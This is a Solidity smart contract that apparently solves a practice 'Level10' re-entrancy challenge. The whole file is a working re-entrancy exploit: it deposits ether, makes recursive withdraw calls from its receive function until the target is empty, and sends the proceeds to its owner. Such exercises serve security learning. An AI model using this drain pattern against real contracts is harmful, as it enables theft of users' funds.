// SPDX-License-Identifier: MIT
// This contract is mainly code found from MrToph example on re-entrancy

pragma solidity ^0.8.13;

import './Level10.sol';

contract ReentrancyAttacker {
    Level10 public level10;
    uint256 initialDeposit;
    address public owner;

    constructor(address _target) {
        level10 = Level10(payable(_target));
        owner = msg.sender;
    }

    function attack() external payable returns (bool) {
        require(msg.value >= 0.1 ether, "send some more ether");

        // depose some funds to be able to trigger withdraw
        initialDeposit = msg.value;
        level10.donate{value: initialDeposit}(address(this));

        // re entrance on the withdraw (meaning continue to withdraw before the first call end)
        callWithdraw();

        //send all funds to owner
        payable(owner).transfer(address(this).balance);
        return true;
    }

    receive() external payable {
        // re-entrance called by the target (it sends back ether, so we trigger the re-entrance here)
        callWithdraw();
    }

    function callWithdraw() private {
        // get the total balance of the contract
        uint256 targetTotalRemainingBalance = address(level10).balance;
        // check if contract is empty or not
        bool keepRecursing = targetTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                initialDeposit < targetTotalRemainingBalance
                    ? initialDeposit
                    : targetTotalRemainingBalance;
            level10.withdraw(toWithdraw);
        }
    }
}